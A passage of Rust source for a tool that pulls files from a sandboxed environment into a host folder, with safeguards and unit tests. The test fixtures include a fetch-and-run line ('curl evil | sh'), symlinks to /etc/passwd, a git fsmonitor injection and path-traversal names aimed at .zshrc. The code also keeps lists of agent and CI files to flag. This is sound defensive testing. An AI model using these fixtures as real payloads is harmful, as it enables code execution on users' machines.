fn is_executable(m: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    m.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_executable(_m: &std::fs::Metadata) -> bool {
    false
}

/// What applying a plan did.
#[derive(Debug, Default)]
pub struct Applied {
    pub written: Vec<String>,
    /// Risky entries left out.
    pub skipped: usize,
    /// Entries that couldn't be written, and why; the rest were.
    pub failed: Vec<(String, String)>,
    /// Why what was written may not survive a power cut: the sync to disk failed.
    pub unsynced: Option<String>,
}

/// Write a reviewed plan. Risky entries are skipped unless `include_risky`. An entry that
/// can't be written is reported and the rest go on; what was written is synced to disk.
pub fn apply_pull(plan: &PullPlan, include_risky: bool) -> Applied {
    let dest = PathBuf::from(&plan.dir);
    let mut done = Applied::default();
    for e in &plan.entries {
        if e.risky.is_some() && !include_risky {
            done.skipped += 1;
            continue;
        }
        let Some(content) = plan.data.get(&e.path) else {
            continue;
        };
        match write_entry(&dest, &e.path, content, &temp_name()) {
            Ok(()) => done.written.push(e.path.clone()),
            Err(err) => done.failed.push((e.path.clone(), format!("{err:#}"))),
        }
    }
    done.unsynced = sync_written(&dest, &done.written)
        .err()
        .map(|e| e.to_string());
    done
}

/// A name for a file being written, beside the one it becomes: random, so it is nobody's file.
pub(crate) fn temp_name() -> String {
    format!(".luoto-{}.tmp", hex::encode(rand::random::<[u8; 8]>()))
}

/// The permission bits of a pulled file: those of the file it replaces, executable as the
/// env's is, or 0644/0755 for a new one.
#[cfg(unix)]
fn mode_for(existing: Option<u32>, executable: bool) -> u32 {
    match existing.map(|m| m & 0o777) {
        None if executable => 0o755,
        None => 0o644,
        // Whoever reads it runs it.
        Some(m) if executable => m | ((m & 0o444) >> 2),
        Some(m) => m & !0o111,
    }
}

/// Write `content` at `rel` under `dest`: into `tmp` beside it first (never through a file
/// already there), flushed, then renamed over it, so the file is the old or the new one. A
/// write that fails leaves no temp file.
pub(crate) fn write_entry(dest: &Path, rel: &str, content: &Content, tmp: &str) -> Result<()> {
    let target = dest.join(rel);
    ensure_parents_inside(dest, &target)?;
    let parent = target.parent().context("no parent")?;
    let tmp = parent.join(tmp);
    let old = std::fs::symlink_metadata(&target).ok();
    if old.as_ref().is_some_and(|m| m.is_dir()) {
        bail!("a folder is there");
    }
    let made = (|| -> Result<()> {
        match content {
            Content::File { bytes, executable } => {
                let mut f = std::fs::OpenOptions::new()
                    .write(true)
                    .create_new(true)
                    .open(&tmp)?;
                f.write_all(bytes)?;
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    let was = old
                        .as_ref()
                        .filter(|m| m.is_file())
                        .map(|m| m.permissions().mode());
                    f.set_permissions(std::fs::Permissions::from_mode(mode_for(was, *executable)))?;
                }
                #[cfg(not(unix))]
                let _ = executable;
                flush(&f)?;
            }
            Content::Link(t) => {
                #[cfg(unix)]
                std::os::unix::fs::symlink(t, &tmp)?;
                #[cfg(not(unix))]
                {
                    let _ = t;
                    bail!("a symlink, which luoto doesn't write on this system");
                }
            }
        }
        // Over a link too: rename replaces the link itself.
        std::fs::rename(&tmp, &target)?;
        Ok(())
    })();
    if made.is_err() {
        let _ = std::fs::remove_file(&tmp);
    }
    made.with_context(|| format!("couldn't write {}", target.display()))
}

/// Hand `f`'s data to the disk. Plain `fsync`: on macOS `sync_all` also waits for the disk to
/// empty its cache, which [`sync_written`] asks once for a whole pull.
pub(crate) fn flush(f: &std::fs::File) -> std::io::Result<()> {
    #[cfg(unix)]
    {
        use std::os::fd::AsRawFd;
        // SAFETY: the descriptor is `f`'s, open for the length of the call.
        if unsafe { libc::fsync(f.as_raw_fd()) } != 0 {
            return Err(std::io::Error::last_os_error());
        }
        Ok(())
    }
    #[cfg(not(unix))]
    f.sync_all()
}

/// Make the files written at `rels` under `dest` last through a power cut: each one's folder
/// is flushed (the rename is the folder's change; the files were flushed as written), then
/// the disk is asked once to write out its cache.
pub(crate) fn sync_written(dest: &Path, rels: &[String]) -> std::io::Result<()> {
    if rels.is_empty() {
        return Ok(());
    }
    // Windows opens no folder as a file; its renames are journaled by NTFS.
    if cfg!(unix) {
        let folders: BTreeSet<PathBuf> = rels
            .iter()
            .filter_map(|r| dest.join(r).parent().map(Path::to_path_buf))
            .collect();
        for d in &folders {
            flush(&std::fs::File::open(d)?)?;
        }
        std::fs::File::open(dest)?.sync_all()?;
    }
    Ok(())
}

/// Create the parents of `target` inside `root`, refusing to walk through a symlink (which
/// could point anywhere on the host).
fn ensure_parents_inside(root: &Path, target: &Path) -> Result<()> {
    let parent = target.parent().context("no parent")?;
    let rel = parent
        .strip_prefix(root)
        .context("path outside the folder")?;
    let mut cur = root.to_path_buf();
    for c in rel.components() {
        let Component::Normal(_) = c else {
            bail!("{} leaves the folder", target.display());
        };
        cur.push(c);
        match std::fs::symlink_metadata(&cur) {
            Ok(m) if m.file_type().is_symlink() => {
                bail!(
                    "{} is a symlink on the host; refusing to write through it",
                    cur.display()
                )
            }
            Ok(m) if m.is_dir() => {}
            Ok(_) => bail!("{} exists and is not a directory", cur.display()),
            Err(_) => std::fs::create_dir(&cur)?,
        }
    }
    Ok(())
}

/// What a plan writes, what it skips as risky and what it refuses, for a terminal: what
/// it comes to and each heading in bold, what happens to a file dim before its path.
pub fn describe(
    plan: &PullPlan,
    w: &mut impl Write,
    style: crate::style::Style,
) -> std::io::Result<()> {
    let risky: Vec<&PlanEntry> = plan.entries.iter().filter(|e| e.risky.is_some()).collect();
    let total = format!(
        "{} new or changed file(s), {} unchanged → {}",
        plan.entries.len(),
        plan.unchanged,
        crate::ssh::tilde(Path::new(&plan.dir))
    );
    writeln!(w, "{}", style.head(&total))?;
    let change = |c: &str| style.dim(&format!("  {c:<7}"));
    for e in plan.entries.iter().filter(|e| e.risky.is_none()).take(30) {
        writeln!(w, "{} {}", change(&e.change), crate::text::display(&e.path))?;
    }
    if plan.entries.len() - risky.len() > 30 {
        writeln!(w, "  … and {} more", plan.entries.len() - risky.len() - 30)?;
    }
    if !risky.is_empty() {
        writeln!(
            w,
            "{}",
            style.head("risky (skipped unless --include-risky):")
        )?;
        for e in &risky {
            writeln!(
                w,
                "{} {} — {}",
                change(&e.change),
                crate::text::display(&e.path),
                e.risky.as_deref().unwrap_or("")
            )?;
        }
    }
    for (p, why) in &plan.refused {
        writeln!(
            w,
            "{}  {} — {}",
            style.head("refused"),
            crate::text::display(p),
            crate::text::display(why)
        )?;
    }
    if let Some(why) = &plan.unread {
        writeln!(
            w,
            "{}",
            style.head("not all of the env's files could be read; what is listed is what came:")
        )?;
        for l in why.lines().take(5) {
            writeln!(w, "  {l}")?;
        }
    }
    Ok(())
}

/// The most never-copied names listed for one folder.
const MAX_NEVER_COPIED: usize = 1000;
/// How long, and how much, the env's `find` for them may take: the sandbox wrote the tree.
const NEVER_COPIED_LIMIT: Duration = Duration::from_secs(30);
const NEVER_COPIED_CAP: usize = 256 << 10;

/// `find` arguments that print each entry under `.` named as `COPY_SKIP` names one, at any
/// depth and whatever it is (tar's `--exclude` leaves out files of those names too), without
/// looking inside one, in `.git` or in the top-level folders `skip`.
pub(crate) fn never_copied_find(skip: &[String]) -> Vec<String> {
    let mut a: Vec<String> = [".", "(", "-name", ".git"].map(String::from).into();
    for name in skip {
        a.extend(["-o".into(), "-path".into(), format!("./{name}")]);
    }
    a.extend([")", "-prune", "-o", "("].map(String::from));
    for (i, name) in COPY_SKIP.iter().enumerate() {
        if i > 0 {
            a.push("-o".into());
        }
        a.extend(["-name".into(), (*name).into()]);
    }
    a.extend([")", "-prune", "-print"].map(String::from));
    a
}

/// The paths [`never_copied_find`] printed, as relative paths: only plain ones that end in a
/// `COPY_SKIP` name (the sandbox wrote the names, so a line may be anything).
pub(crate) fn never_copied_lines(out: &str) -> Vec<String> {
    out.lines()
        .filter_map(|l| safe_rel(Path::new(l)))
        .filter(|p| {
            p.file_name()
                .and_then(|n| n.to_str())
                .is_some_and(|n| COPY_SKIP.contains(&n))
        })
        .map(|p| p.to_string_lossy().into_owned())
        .take(MAX_NEVER_COPIED)
        .collect()
}

/// What the running env holds under `target` that no copy or pull ever takes (`COPY_SKIP`).
pub fn never_copied(ctx: &Ctx, env: &str, target: &PullTarget) -> Result<Vec<String>> {
    let src = match &target.repo {
        Some(name) => format!("/workspace/{name}"),
        None => "/workspace".to_string(),
    };
    let mut argv = vec![
        "sh".to_string(),
        "-c".into(),
        r#"cd "$0" && exec find "$@""#.into(),
        src,
    ];
    argv.extend(never_copied_find(&target.skip));
    let out = ctx.rt.run_limited(
        exec(&names::dev(env)).user(UID).argv(argv),
        NEVER_COPIED_LIMIT,
        NEVER_COPIED_CAP,
    )?;
    Ok(never_copied_lines(&out))
}

/// Which of `rels` the git repository whose root is `dest` ignores, as a file or as a folder
/// (a rule such as `target/` names only folders, and the folder may not exist here): none
/// when `dest` is no repository's root (a folder inside a bigger work tree is not judged by
/// that tree's rules, as in [`collect`]) or git can't say.
pub fn host_ignored(dest: &Path, rels: &[String]) -> BTreeSet<String> {
    if rels.is_empty() || !dest.join(".git").exists() {
        return BTreeSet::new();
    }
    let child = std::process::Command::new("git")
        .args(["-c", "core.fsmonitor=false", "-C"])
        .arg(dest)
        .args(["check-ignore", "-z", "--stdin"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn();
    let Ok(mut child) = child else {
        return BTreeSet::new();
    };
    let input: Vec<u8> = rels
        .iter()
        .flat_map(|r| [r.clone(), format!("{r}/")])
        .flat_map(|r| r.into_bytes().into_iter().chain(std::iter::once(0)))
        .collect();
    let stdin = child.stdin.take();
    let writer = std::thread::spawn(move || {
        if let Some(mut stdin) = stdin {
            let _ = stdin.write_all(&input);
        }
    });
    let out = child.wait_with_output();
    let _ = writer.join();
    let Ok(out) = out else {
        return BTreeSet::new();
    };
    String::from_utf8_lossy(&out.stdout)
        .split('\0')
        .map(|p| p.strip_suffix('/').unwrap_or(p))
        .filter(|p| rels.iter().any(|r| r == p))
        .map(str::to_string)
        .collect()
}

/// What an env holds for one of its folders that the folder doesn't have.
#[derive(Debug, Default, PartialEq)]
pub struct Unpulled {
    pub dir: String,
    /// Files new or changed in the env, the risky ones among them.
    pub changed: usize,
    pub refused: usize,
    /// Not all of the env's files could be read.
    pub unread: bool,
    /// What no pull takes (`COPY_SKIP`) and the folder's repository doesn't ignore.
    pub never_copied: Vec<String>,
}

impl Unpulled {
    pub fn any(&self) -> bool {
        self.changed + self.refused + self.never_copied.len() > 0 || self.unread
    }
}

impl std::fmt::Display for Unpulled {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let mut parts = Vec::new();
        match self.changed {
            0 => {}
            1 => parts.push("1 file new or changed".to_string()),
            n => parts.push(format!("{n} files new or changed")),
        }
        if self.refused > 0 {
            parts.push(format!("{} refused", self.refused));
        }
        if self.unread {
            parts.push("not all of it could be read".into());
        }
        if !self.never_copied.is_empty() {
            let named: Vec<String> = self
                .never_copied
                .iter()
                .take(3)
                .map(|p| crate::text::display(p))
                .collect();
            let more = self.never_copied.len().saturating_sub(named.len());
            parts.push(format!(
                "{} never copied ({}{})",
                self.never_copied.len(),
                named.join(", "),
                if more > 0 { ", …" } else { "" }
            ));
        }
        write!(
            f,
            "{}: {}",
            crate::ssh::tilde(Path::new(&self.dir)),
            parts.join(", ")
        )
    }
}

/// What the running env holds for `target` that its folder doesn't.
pub fn unpulled(ctx: &Ctx, env: &str, target: &PullTarget) -> Result<Unpulled> {
    let plan = plan_pull(ctx, env, target, false)?;
    let found = never_copied(ctx, env, target)?;
    let ignored = host_ignored(&target.dest, &found);
    Ok(Unpulled {
        dir: plan.dir.clone(),
        changed: plan.entries.len(),
        refused: plan.refused.len(),
        unread: plan.unread.is_some(),
        never_copied: found.into_iter().filter(|p| !ignored.contains(p)).collect(),
    })
}

/// Every folder a pull writes, and one digest over them that applying checks.
#[derive(serde::Serialize)]
pub struct PullPlans {
    pub plans: Vec<PullPlan>,
    pub digest: String,
}

/// What a pull of every folder would write.
pub fn pull_plans(ctx: &Ctx, name: &str) -> Result<PullPlans> {
    let plans = crate::commands::pull_targets(ctx, name, None, None)?
        .iter()
        .map(|t| plan_pull(ctx, name, t, false))
        .collect::<Result<Vec<_>>>()?;
    let digest = plans
        .iter()
        .map(|p| p.digest.as_str())
        .collect::<Vec<_>>()
        .join(":");
    Ok(PullPlans { plans, digest })
}

#[derive(serde::Serialize)]
pub struct Pulled {
    pub written: usize,
    pub skipped: usize,
    /// Files that couldn't be written, and why.
    pub failed: Vec<(String, String)>,
}

/// Pull every folder, if what it would write is still what `digest` reviewed.
pub fn apply_pulls(ctx: &Ctx, name: &str, digest: &str, include_risky: bool) -> Result<Pulled> {
    let all = pull_plans(ctx, name)?;
    if all.digest != digest {
        bail!("the env's files changed since you reviewed them; review again");
    }
    let mut pulled = Pulled {
        written: 0,
        skipped: 0,
        failed: Vec::new(),
    };
    for plan in &all.plans {
        let done = apply_pull(plan, include_risky);
        pulled.written += done.written.len();
        pulled.skipped += done.skipped;
        pulled.failed.extend(done.failed);
        if let Some(why) = done.unsynced {
            pulled
                .failed
                .push((plan.dir.clone(), format!("not synced to disk: {why}")));
        }
    }
    Ok(pulled)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn plan_of(raw: &[u8], dest: &Path, skip: &[String]) -> PullPlan {
        let read = TarRead {
            raw: raw.to_vec(),
            failed: None,
        };
        build_plan(&read, dest, skip).unwrap()
    }

    /// The files luoto left in `dir` while writing.
    fn temp_files(dir: &Path) -> Vec<String> {
        std::fs::read_dir(dir)
            .unwrap()
            .flatten()
            .filter_map(|e| e.file_name().into_string().ok())
            .filter(|n| n.starts_with(".luoto-"))
            .collect()
    }

    #[test]
    fn a_tar_that_failed_is_read_as_far_as_it_goes_and_the_plan_says_so() {
        let dir = tempfile::tempdir().unwrap();
        let mut raw = tar_of(&[("./a.txt", b"a"), ("./b.txt", &[b'b'; 4096])]);
        // Cut inside b.txt, as a tar killed or failing mid-file leaves it.
        raw.truncate(512 + 512 + 512 + 100);
        let cut = TarRead {
            raw: raw.clone(),
            failed: Some("tar: ./c.txt: Permission denied".into()),
        };
        let plan = build_plan(&cut, dir.path(), &[]).unwrap();
        let paths: Vec<&str> = plan.entries.iter().map(|e| e.path.as_str()).collect();
        assert_eq!(paths, ["a.txt"], "the half-read file is not in the plan");
        assert!(
            plan.unread
                .as_deref()
                .unwrap()
                .contains("Permission denied")
        );
        let mut said = Vec::new();
        describe(&plan, &mut said, crate::style::Style::PLAIN).unwrap();
        assert!(
            String::from_utf8(said)
                .unwrap()
                .contains("not all of the env's files")
        );
        // The same bytes from a tar that reported success are an error, not a plan.
        let whole = TarRead { raw, failed: None };
        assert!(build_plan(&whole, dir.path(), &[]).is_err());
    }

    #[cfg(unix)]
    #[test]
    fn a_tar_is_read_within_its_cap_and_its_failure_is_kept() {
        let sh = |script: &str| {
            std::process::Command::new("sh")
                .args(["-c", script])
                .stdin(Stdio::null())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .unwrap()
        };
        let ok = read_tar(sh("printf abc"), 10, None).unwrap();
        assert_eq!((ok.raw.as_slice(), ok.failed), (&b"abc"[..], None));
        let failed = read_tar(sh("printf abc; echo 'tar: boom' >&2; exit 2"), 10, None).unwrap();
        assert_eq!(
            failed.raw, b"abc",
            "output before a failure is no whole archive"
        );
        assert_eq!(failed.failed.as_deref(), Some("tar: boom"));
        let big = read_tar(sh("yes | head -c 100000; sleep 30"), 10, None);
        assert!(matches!(big, Err(TarError::TooLarge)));
        let slow = read_tar(sh("sleep 30"), 10, Some(Duration::from_millis(100)));
        assert!(matches!(slow, Err(TarError::Late(_))));
    }

    #[cfg(unix)]
    #[test]
    fn a_pull_writes_through_names_of_its_own_and_keeps_a_files_mode() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path();
        let mode = |p: &str| std::fs::metadata(d.join(p)).unwrap().permissions().mode() & 0o777;
        // A file of yours by the old temp name, a private file, and a folder where a file goes.
        std::fs::write(d.join("notes.luoto-tmp"), b"mine").unwrap();
        std::fs::write(d.join("key.pem"), b"old").unwrap();
        std::fs::set_permissions(d.join("key.pem"), std::fs::Permissions::from_mode(0o600))
            .unwrap();
        std::fs::create_dir(d.join("blocked")).unwrap();
        let raw = tarball(
            &[
                ("./notes", b"n", 0o644),
                ("./key.pem", b"new", 0o644),
                ("./blocked", b"x", 0o644),
                ("./new.sh", b"#!/bin/sh", 0o755),
                ("./sub/plain.txt", b"p", 0o600),
            ],
            &[],
        );
        let done = apply_pull(&plan_of(&raw, d, &[]), true);
        assert_eq!(done.failed.len(), 1, "{:?}", done.failed);
        assert_eq!(done.failed[0].0, "blocked");
        assert_eq!(done.written.len(), 4);
        assert_eq!(std::fs::read(d.join("notes.luoto-tmp")).unwrap(), b"mine");
        assert_eq!(std::fs::read(d.join("key.pem")).unwrap(), b"new");
        assert_eq!(mode("key.pem"), 0o600, "the mode it had");
        assert_eq!(mode("new.sh"), 0o755);
        assert_eq!(
            mode("sub/plain.txt"),
            0o644,
            "a new file gets 0644, whatever the env's"
        );
        // Nothing of the writing is left, in a folder that took a file or one that refused.
        assert!(temp_files(d).is_empty() && temp_files(&d.join("sub")).is_empty());
        assert!(d.join("blocked").is_dir());

        assert_eq!(mode_for(None, false), 0o644);
        assert_eq!(mode_for(Some(0o100600), true), 0o700);
        assert_eq!(mode_for(Some(0o640), true), 0o750);
        assert_eq!(mode_for(Some(0o755), false), 0o644);
        assert_eq!(mode_for(Some(0o4755), true), 0o755, "no setuid bit is kept");
    }

    #[cfg(unix)]
    #[test]
    fn a_pulled_link_replaces_what_was_there_in_one_step() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path();
        std::fs::write(d.join("a"), b"a").unwrap();
        std::fs::write(d.join("l"), b"a file").unwrap();
        let raw = tarball(&[], &[("./l", "a")]);
        let done = apply_pull(&plan_of(&raw, d, &[]), true);
        assert_eq!(done.written, ["l"]);
        assert_eq!(std::fs::read_link(d.join("l")).unwrap(), Path::new("a"));
        assert!(temp_files(d).is_empty());
    }

    #[test]
    fn files_agents_and_ci_act_on_are_risky() {
        for p in [
            ".env",
            ".env.local",
            ".env.production",
            ".ENV",
            "bunfig.toml",
            ".mcp.json",
            "AGENTS.md",
            "CLAUDE.md",
            "agents.MD",
            ".github/workflows/ci.yml",
            ".github/workflows/sub/deploy.yaml",
        ] {
            assert!(risky(p).is_some(), "{p}");
        }
        for p in [
            "web/.env",
            "api/.env.test",
            "packages/app/AGENTS.md",
            "docs/CLAUDE.md",
            "tools/.mcp.json",
            "sub/.github/workflows/ci.yml",
        ] {
            assert!(risky_nested(p).is_some(), "{p}");
        }
        for p in [
            "src/env.rs",
            ".environment",
            "docs/agents.md.txt",
            ".github/dependabot.yml",
            ".github/ISSUE_TEMPLATE/bug.md",
            "src/.env.d/readme",
        ] {
            assert!(risky_nested(p).is_none(), "{p}");
        }
    }

    #[test]
    fn what_no_pull_takes_is_found_at_any_depth_and_only_by_those_names() {
        let args = never_copied_find(&["api".into()]).join(" ");
        assert!(args.starts_with(". ( -name .git -o -path ./api ) -prune -o ( -name node_modules"));
        assert!(args.ends_with("-name .terraform ) -prune -print"));
        let found = never_copied_lines(
            "./node_modules\n./web/src/target\n./notes.md\n../../target\n/etc/target\n\
             ./a\\target\n./deep/a/b/.venv\n",
        );
        assert_eq!(found, ["node_modules", "web/src/target", "deep/a/b/.venv"]);
    }

    #[test]
    fn the_folders_repository_says_what_it_ignores() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path();
        let rels = ["node_modules".to_string(), "src/target".to_string()];
        assert!(host_ignored(d, &rels).is_empty(), "no repository, no say");
        assert!(
            std::process::Command::new("git")
                .args(["init", "-q"])
                .arg(d)
                .status()
                .unwrap()
                .success()
        );
        std::fs::write(d.join(".gitignore"), "node_modules/\n").unwrap();
        assert_eq!(
            host_ignored(d, &rels),
            BTreeSet::from(["node_modules".to_string()])
        );
        // A folder inside a work tree is not judged by the tree's rules.
        std::fs::create_dir(d.join("sub")).unwrap();
        assert!(host_ignored(&d.join("sub"), &rels).is_empty());
    }

    #[test]
    fn what_only_the_env_has_is_said_per_folder() {
        let u = Unpulled {
            dir: "/srv/work/api".into(),
            changed: 3,
            refused: 1,
            unread: true,
            never_copied: vec![
                "target".into(),
                "a/target".into(),
                "b/target".into(),
                "c/.venv".into(),
            ],
        };
        assert!(u.any());
        assert_eq!(
            u.to_string(),
            "/srv/work/api: 3 files new or changed, 1 refused, not all of it could be read, 4 \
             never copied (target, a/target, b/target, …)"
        );
        assert!(!Unpulled::default().any());
        let one = Unpulled {
            dir: "/srv/x".into(),
            changed: 1,
            ..Default::default()
        };
        assert_eq!(one.to_string(), "/srv/x: 1 file new or changed");
    }

    fn tar_of(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut b = tar::Builder::new(Vec::new());
        for (path, data) in files {
            let mut h = tar::Header::new_gnu();
            h.set_size(data.len() as u64);
            h.set_mode(0o644);
            h.set_cksum();
            b.append_data(&mut h, path, *data).unwrap();
        }
        b.into_inner().unwrap()
    }

    #[test]
    fn pull_refuses_disguised_git_and_case_collisions() {
        let dir = tempfile::tempdir().unwrap();
        let raw = tar_of(&[
            (".GIT/config", b"[core]\n\tfsmonitor = evil\n"),
            (".g\u{200c}it/HEAD", b"x"),
            ("GIT~1/config", b"x"),
            ("README.md", b"a"),
            ("readme.MD", b"b"),
            (".VSCODE/tasks.json", b"{}"),
        ]);
        let plan = plan_of(&raw, dir.path(), &[]);
        let refused: Vec<&str> = plan.refused.iter().map(|(p, _)| p.as_str()).collect();
        assert!(refused.contains(&".GIT/config"));
        assert!(refused.contains(&".g\u{200c}it/HEAD"));
        assert!(refused.contains(&"GIT~1/config"));
        assert!(refused.contains(&"readme.MD"));
        let vscode = plan
            .entries
            .iter()
            .find(|e| e.path == ".VSCODE/tasks.json")
            .unwrap();
        assert!(vscode.risky.is_some());
    }

    #[test]
    fn risky_covers_build_tool_configs() {
        for p in [
            ".config/mise/config.toml",
            ".yarnrc.yml",
            ".cargo/config.toml",
            "gradle/wrapper/gradle-wrapper.properties",
            ".mvn/extensions.xml",
            ".claude/settings.json",
            ".Envrc",
        ] {
            assert!(risky(p).is_some(), "{p}");
        }
        assert!(risky("src/main.rs").is_none());
    }

    fn tarball(entries: &[(&str, &[u8], u32)], links: &[(&str, &str)]) -> Vec<u8> {
        let mut b = tar::Builder::new(Vec::new());
        for (p, data, mode) in entries {
            let mut h = tar::Header::new_gnu();
            h.set_size(data.len() as u64);
            h.set_mode(*mode);
            h.set_entry_type(tar::EntryType::Regular);
            h.set_cksum();
            b.append_data(&mut h, p, *data).unwrap();
        }
        for (p, target) in links {
            let mut h = tar::Header::new_gnu();
            h.set_entry_type(tar::EntryType::Symlink);
            h.set_size(0);
            b.append_link(&mut h, p, target).unwrap();
        }
        b.into_inner().unwrap()
    }

    #[test]
    fn each_file_is_read_by_its_length_and_anything_else_stops_it() {
        let names = ["a", "b", "c", "d"];
        let t = framed(&names, b"3\nx\ny-\n  2\nzz", 9);
        assert_eq!(t.get("a").map(Vec::as_slice), Some(&b"x\ny"[..]));
        assert_eq!(t.get("c").map(Vec::as_slice), Some(&b"zz"[..]));
        assert_eq!(t.len(), 2, "b is absent and d never came");
        assert!(framed(&names, b"9\nshort", 9).is_empty());
        assert!(framed(&names, b"3\nabc", 2).is_empty(), "over the limit");
        assert!(framed(&names, b"x\n", 9).is_empty());
    }

    #[test]
    fn names_from_dirs() {
        assert_eq!(name_from("/Users/x/dev/My_Project"), "my-project");
        assert_eq!(name_from("eetu/luoto.git"), "luoto");
        assert_eq!(name_from("/tmp/x/"), "x");
    }

    #[test]
    fn plan_flags_risky_and_refuses_escapes() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("same.txt"), b"same").unwrap();
        let raw = tarball(
            &[
                ("./src/main.rs", b"fn main() {}", 0o644),
                ("./same.txt", b"same", 0o644),
                ("./.envrc", b"curl evil | sh", 0o644),
                ("./.vscode/tasks.json", b"{}", 0o644),
                ("./run.sh", b"#!/bin/sh", 0o755),
            ],
            &[
                ("./ok-link", "src/main.rs"),
                ("./bad-link", "../../etc/passwd"),
                ("./abs", "/etc/passwd"),
            ],
        );
        let plan = plan_of(&raw, dir.path(), &[]);
        assert_eq!(plan.unchanged, 1);
        let get = |p: &str| plan.entries.iter().find(|e| e.path == p);
        assert!(get("src/main.rs").unwrap().risky.is_none());
        assert!(get(".envrc").unwrap().risky.is_some());
        assert!(get(".vscode/tasks.json").unwrap().risky.is_some());
        assert_eq!(
            get("run.sh").unwrap().risky.as_deref(),
            Some("becomes executable")
        );
        assert!(get("ok-link").is_some());
        assert_eq!(plan.refused.len(), 2);

        let done = apply_pull(&plan, false);
        assert_eq!((done.written.len(), done.skipped), (1, 4));
        assert!(done.failed.is_empty() && done.unsynced.is_none());
        assert!(dir.path().join("src/main.rs").exists());
        assert!(!dir.path().join(".envrc").exists());
    }

    #[cfg(unix)]
    #[test]
    fn a_backslash_name_is_refused_not_turned_into_a_path() {
        let root = tempfile::tempdir().unwrap();
        let dir = root.path().join("a/b/project");
        std::fs::create_dir_all(&dir).unwrap();
        let raw = tarball(
            &[
                ("./x\\..\\..\\..\\.zshrc", b"evil", 0o644),
                ("./x\\..\\.git\\config", b"evil", 0o644),
            ],
            &[("./l", "..\\..\\.zshrc")],
        );
        let plan = plan_of(&raw, &dir, &[]);
        assert!(plan.entries.is_empty(), "{:?}", plan.entries);
        assert_eq!(plan.refused.len(), 3);
        apply_pull(&plan, true);
        assert!(!root.path().join("a/.zshrc").exists());
        assert!(!dir.join(".git").exists());
    }

    #[test]
    fn risky_names_are_folded_as_the_filesystem_folds_them() {
        assert!(
            risky(".v\u{17f}code/tasks.json").is_some(),
            "long s is s on APFS"
        );
        assert!(risky("mi\u{17f}e.toml").is_some());
        assert!(risky("VSCODE~1/tasks.json").is_some(), "an 8.3 short name");
        assert!(risky("src/notes~draft.md").is_none());
    }

    #[cfg(unix)]
    #[test]
    fn refuses_writing_through_host_symlinks() {
        let dir = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        std::os::unix::fs::symlink(outside.path(), dir.path().join("src")).unwrap();
        let raw = tarball(
            &[("./src/x.rs", b"x", 0o644), ("./ok.rs", b"ok", 0o644)],
            &[],
        );
        let plan = plan_of(&raw, dir.path(), &[]);
        // The one that can't be written is named, and the rest are written.
        let done = apply_pull(&plan, false);
        assert_eq!(done.written, ["ok.rs"]);
        assert_eq!(done.failed.len(), 1);
        assert_eq!(done.failed[0].0, "src/x.rs");
        assert!(done.failed[0].1.contains("symlink"), "{:?}", done.failed);
        assert!(!outside.path().join("x.rs").exists());
    }

    #[test]
    fn risky_holds_for_nested_projects() {
        for p in [
            "api/.git/hooks/post-checkout",
            "api/.envrc",
            "web/.vscode/tasks.json",
            "libs/core/gradlew",
            "api/.claude/settings.json",
        ] {
            assert!(risky_nested(p).is_some(), "{p}");
        }
        assert!(risky_nested("api/src/main.rs").is_none());
        assert!(risky_nested("docs/envrc.md").is_none());
    }

    #[test]
    fn pull_leaves_out_repos_with_their_own_folder() {
        let dir = tempfile::tempdir().unwrap();
        let raw = tar_of(&[
            ("./notes.md", b"n"),
            ("./api/src/main.rs", b"x"),
            ("./API/x", b"x"),
            ("./web/.envrc", b"x"),
        ]);
        let plan = plan_of(&raw, dir.path(), &["api".into()]);
        let paths: Vec<&str> = plan.entries.iter().map(|e| e.path.as_str()).collect();
        assert_eq!(paths, ["notes.md", "web/.envrc"]);
        assert!(plan.entries[1].risky.is_some());
    }

    #[test]
    fn a_virtual_workspace_pulls_only_its_repos() {
        let api = tempfile::tempdir().unwrap();
        let ws = Workspace {
            repos: BTreeMap::from([(
                "api".to_string(),
                config::Repo {
                    dir: Some(api.path().display().to_string()),
                    ..Default::default()
                },
            )]),
            ..Default::default()
        };
        let present = BTreeSet::from(["api".to_string()]);
        let all = pull_targets(&ws, None, None, &present).unwrap();
        // /workspace itself is never a destination, whatever it holds.
        assert_eq!(all.len(), 1);
        assert_eq!(all[0].repo.as_deref(), Some("api"));
        assert_eq!(all[0].dest, api.path().canonicalize().unwrap());
    }

    #[test]
    fn pull_targets_send_each_folder_repo_home() {
        let root = tempfile::tempdir().unwrap();
        let api = tempfile::tempdir().unwrap();
        let canon = |p: &Path| p.canonicalize().unwrap();
        let ws = Workspace {
            dir: Some(root.path().display().to_string()),
            repos: BTreeMap::from([
                (
                    "api".to_string(),
                    config::Repo {
                        dir: Some(api.path().display().to_string()),
                        ..Default::default()
                    },
                ),
                (
                    "web".to_string(),
                    config::Repo {
                        url: Some("acme/web".into()),
                        ..Default::default()
                    },
                ),
            ]),
            ..Default::default()
        };
        let present = BTreeSet::from(["api".to_string(), "web".to_string()]);
        let all = pull_targets(&ws, None, None, &present).unwrap();
        assert_eq!(all.len(), 2);
        assert_eq!(all[0].dest, canon(root.path()));
        assert_eq!(all[0].skip, ["api", "web"]);
        assert_eq!(all[1].repo.as_deref(), Some("api"));
        assert_eq!(all[1].dest, canon(api.path()));
        assert_eq!(
            pull_targets(&ws, None, None, &BTreeSet::new())
                .unwrap()
                .len(),
            1
        );
        // With `--to`, each repo lands under it, never in its own folder.
        let to = tempfile::tempdir().unwrap();
        let elsewhere = pull_targets(&ws, Some(to.path().to_path_buf()), None, &present).unwrap();
        assert_eq!(elsewhere[1].dest, to.path().join("api"));
        // A repo whose folder is gone is left out.
        let gone = Workspace {
            repos: BTreeMap::from([(
                "old".to_string(),
                config::Repo {
                    dir: Some("/nonexistent/luoto-test".into()),
